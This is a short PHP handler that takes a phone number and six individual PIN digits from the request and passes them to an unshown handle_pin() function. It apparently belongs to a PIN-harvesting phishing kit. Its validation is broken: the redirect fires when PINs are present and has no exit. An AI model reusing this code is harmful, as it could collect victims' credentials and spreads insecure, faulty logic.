<?php
require_once 'functions.php';

$data = $_REQUEST;

$pin1  = $data['pin1'];
$pin2  = $data['pin2'];
$pin3  = $data['pin3'];
$pin4  = $data['pin4'];
$pin5  = $data['pin5'];
$pin6  = $data['pin6'];
$nomor = $data['nomor'];


if ( ! $nomor || $pin1 || $pin2 || $pin3 || $pin4 || $pin5 || $pin6 ) {
    header( 'Location: star.php' );
}

$data = [
    'pin1'  => $pin1,
    'pin2'  => $pin2,
    'pin3'  => $pin3,
    'pin4'  => $pin4,
    'pin5'  => $pin5,
    'pin6'  => $pin6,
    'nomor' => $nomor,
];

handle_pin( $data );